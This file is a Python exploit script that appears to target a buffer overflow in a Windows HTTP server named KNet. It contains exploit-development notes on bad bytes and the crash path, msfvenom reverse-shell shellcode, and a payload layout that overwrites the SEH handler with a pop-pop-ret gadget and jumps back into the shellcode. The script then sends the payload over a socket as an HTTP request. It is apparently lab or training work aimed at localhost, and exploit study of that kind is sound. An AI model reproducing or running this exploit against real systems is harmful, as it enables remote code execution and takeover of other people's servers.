#!/usr/bin/python
import socket
import pwn

"""
NOTES

ROP
crtdll.dll 0x10010000

BAD BYTES
0x00, 0x0a, 0x0d, 0x20, 0x2e, 0x2f

CALL STACK

CRTDLL!_docat+0x29 -> rep stos; fails here
KNet+cfcb 


FLOW
KNet+cfcb(PATH + buffer, ...) -> KNet+0xd8f2 -> KNet+0x129d0 -> CRTDLL!strcpy -> CRTDLL!_docat -> repne scas ERROR (write into READ_ONLY mem)

ROP
CRTDLL 1001a873 -> pop, pop, ret
"""


# Destination server
host = "127.0.0.1"
port = 80

# Exploit function
def send_exploit_request():
    # Payload

    """
    bad_bytes = [0x00, 0x0a, 0x0d, 0x20, 0x2e, 0x2f]
    bad_bytes_check = [i for i in range(0x00, 0x100)]
    for bb in bad_bytes:
        bad_bytes_check.remove(bb)
    bad_bytes_check = bytes(bad_bytes_check)
    """

    # msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python -b "\x00\x0a\x0d\x20\x2e\x2f" -v shellcode
    shellcode =  b""
    shellcode += b"\xd9\xea\xbf\xee\xe1\x2c\xb7\xd9\x74\x24\xf4"
    shellcode += b"\x58\x33\xc9\xb1\x52\x31\x78\x17\x83\xe8\xfc"
    shellcode += b"\x03\x96\xf2\xce\x42\x9a\x1d\x8c\xad\x62\xde"
    shellcode += b"\xf1\x24\x87\xef\x31\x52\xcc\x40\x82\x10\x80"
    shellcode += b"\x6c\x69\x74\x30\xe6\x1f\x51\x37\x4f\x95\x87"
    shellcode += b"\x76\x50\x86\xf4\x19\xd2\xd5\x28\xf9\xeb\x15"
    shellcode += b"\x3d\xf8\x2c\x4b\xcc\xa8\xe5\x07\x63\x5c\x81"
    shellcode += b"\x52\xb8\xd7\xd9\x73\xb8\x04\xa9\x72\xe9\x9b"
    shellcode += b"\xa1\x2c\x29\x1a\x65\x45\x60\x04\x6a\x60\x3a"
    shellcode += b"\xbf\x58\x1e\xbd\x69\x91\xdf\x12\x54\x1d\x12"
    shellcode += b"\x6a\x91\x9a\xcd\x19\xeb\xd8\x70\x1a\x28\xa2"
    shellcode += b"\xae\xaf\xaa\x04\x24\x17\x16\xb4\xe9\xce\xdd"
    shellcode += b"\xba\x46\x84\xb9\xde\x59\x49\xb2\xdb\xd2\x6c"
    shellcode += b"\x14\x6a\xa0\x4a\xb0\x36\x72\xf2\xe1\x92\xd5"
    shellcode += b"\x0b\xf1\x7c\x89\xa9\x7a\x90\xde\xc3\x21\xfd"
    shellcode += b"\x13\xee\xd9\xfd\x3b\x79\xaa\xcf\xe4\xd1\x24"
    shellcode += b"\x7c\x6c\xfc\xb3\x83\x47\xb8\x2b\x7a\x68\xb9"
    shellcode += b"\x62\xb9\x3c\xe9\x1c\x68\x3d\x62\xdc\x95\xe8"
    shellcode += b"\x25\x8c\x39\x43\x86\x7c\xfa\x33\x6e\x96\xf5"
    shellcode += b"\x6c\x8e\x99\xdf\x04\x25\x60\x88\x55\xba\x6a"
    shellcode += b"\x49\xc2\xb8\x6a\x58\x4e\x34\x8c\x30\x7e\x10"
    shellcode += b"\x07\xad\xe7\x39\xd3\x4c\xe7\x97\x9e\x4f\x63"
    shellcode += b"\x14\x5f\x01\x84\x51\x73\xf6\x64\x2c\x29\x51"
    shellcode += b"\x7a\x9a\x45\x3d\xe9\x41\x95\x48\x12\xde\xc2"
    shellcode += b"\x1d\xe4\x17\x86\xb3\x5f\x8e\xb4\x49\x39\xe9"
    shellcode += b"\x7c\x96\xfa\xf4\x7d\x5b\x46\xd3\x6d\xa5\x47"
    shellcode += b"\x5f\xd9\x79\x1e\x09\xb7\x3f\xc8\xfb\x61\x96"
    shellcode += b"\xa7\x55\xe5\x6f\x84\x65\x73\x70\xc1\x13\x9b"
    shellcode += b"\xc1\xbc\x65\xa4\xee\x28\x62\xdd\x12\xc9\x8d"
    shellcode += b"\x34\x97\xf9\xc7\x14\xbe\x91\x81\xcd\x82\xff"
    shellcode += b"\x31\x38\xc0\xf9\xb1\xc8\xb9\xfd\xaa\xb9\xbc"
    shellcode += b"\xba\x6c\x52\xcd\xd3\x18\x54\x62\xd3\x08"

    buffer = pwn.flat({
        15: shellcode,
        1260: b"\xeb\x06", # jmp short 8
        1264: pwn.p32(0x1001a873), # pop, pop, ret
        1268: b"\xe9\x11\xfb\xff\xff", # jmp near -1258
    }, length=2000, filler=b"\x90")
    
    #HTTP Request
    request  = buffer + b" / HTTP/1.0\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    print(s.recv(1024))
    s.close()

if __name__ == "__main__": 

    send_exploit_request()